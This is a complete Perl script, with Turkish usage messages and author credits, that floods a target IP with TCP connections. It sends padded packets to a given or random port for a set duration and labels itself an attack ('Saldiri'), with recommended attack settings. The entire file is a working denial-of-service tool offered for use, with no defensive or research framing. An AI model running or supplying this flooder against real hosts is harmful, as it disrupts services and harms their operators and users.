#!/usr/bin/perl

use Socket;
use strict;
use IO::Socket::INET;

if ($#ARGV != 3) {
    print "Scripts Yapimci: Hayalet / Alkol / Serhat / Kloex / Serdar / \n";
    print "Kullanim: apc_tcp.pl <ip> <port> <paket> <zaman>\n";
    print "Onerilen Vurulus Sekli: apc_tcp.pl <ip> <port> <1000> <300>\n";
    exit(1);
}

my ($ip, $port, $size, $time) = @ARGV;

my ($endtime, $psize, $pport);

$endtime = time() + ($time ? $time : 1000000);

print "Saldirilan Ip: $ip, Port: " . ($port ? $port : "random") . ", Paket: " .
($size ? "$size-Byte, " : "random size") .
($time ? "Saniye: $time" : "") . "\n";

for (; time() <= $endtime;) {
    $psize = $size ? $size : int(rand(2000-70)+70);
    $pport = $port ? $port : int(rand(65500))+1;
    
    my $socket = IO::Socket::INET->new(
        PeerAddr => $ip,
        PeerPort => $pport,
        Proto    => 'tcp',
        Timeout  => 1
    );

    if ($socket) {
        my $data = pack("a$psize", "NeoProtect");
        print $socket $data;
        $socket->close();
    }
}

print "Saldiri tamamlandi.\n";
